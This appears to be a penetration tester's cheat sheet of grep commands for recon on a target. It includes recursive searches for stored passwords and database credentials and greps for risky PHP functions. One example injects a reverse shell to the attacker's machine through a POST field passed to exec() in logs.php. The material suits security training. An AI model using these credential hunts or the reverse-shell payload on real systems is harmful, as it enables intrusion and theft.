#### Multiple strings
```bash -target
grep "username\|password\|is_admin" backup-2022-12-19
```
```bash - target
grep -E "username|password|is_admin" backup-2022-12-19
```
#### Grep'n for passwords
```bash - target
cd /var/
```
```bash - target
grep -rli "db_login" * 2>/dev/null
```
```bash - target
grep -rli "db_user" * 2>/dev/null
```
```bash - target
grep -rli "db_password" * 2>/dev/null
```
```bash - target
grep -rli "DBUSER" * 2>/dev/null
```
```bash - target
grep -rli "DBPASS" * 2>/dev/null
```
```bash - target
grep -rli "password" * 2>/dev/null
```
```bash - target
grep -rli "pass" * 2>/dev/null
```
```bash - target
grep -rli "pwd" * 2>/dev/null
```
#### Grep'n for PHP vulnerabilities
```bash - kali
grep -R -e system -e exec -e passthru -e '`' -e popen -e proc_open * | more
```
`download.php: flush(); // Flush system headers`
`logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");`
`logs.php: flush(); // Flush system headers`
Here we see some comments, but the middle entry for logs.php is a legit finding.
We would just go to the logs.php page, capture the post request in Burp, and modify the request to:
```bash - burp
delim=comma;bash -c 'bash -i >%26 /dev/tcp/$KALI/443 0>%261'
```
#### Grep'n for HTML comments from HTTrack
```bash - kali
grep -r '<!--.*-->' ./ | grep -v "HTTrack" | more
```
#### Grep'n for emails from HTTrack
```bash - kali
grep -Eiorh '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})' "$@" * | sort | uniq
```
#### Grep'n for php vulnerabilities
```
https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet
```
### Grep'n for http/s
```bash - kali
grep -Erio 'https?://[^ "\(\)\<\>]*' 2> /dev/null
```
#### Grep'n for IPs
```bash - kali
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" 2> /dev/null
```
#### Grep'n for details in access logs
```bash - kali
grep -o '[^/]*\.js' access_log.txt | sort -u
```
